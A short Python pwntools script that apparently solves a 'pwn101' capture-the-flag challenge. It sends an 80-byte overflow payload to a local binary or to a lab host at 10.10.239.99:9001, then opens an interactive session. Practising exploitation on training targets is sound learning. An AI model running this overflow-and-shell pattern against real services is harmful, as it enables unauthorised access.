#!/usr/bin/python3

from pwn import *

local = True
filename = './pwn101.pwn101'
hostname = '10.10.239.99'
port = 9001

if local:
    p = process(filename)
else:
    p = remote(hostname, port)

payload = "A" * 80

p.sendline(payload)
p.interactive()



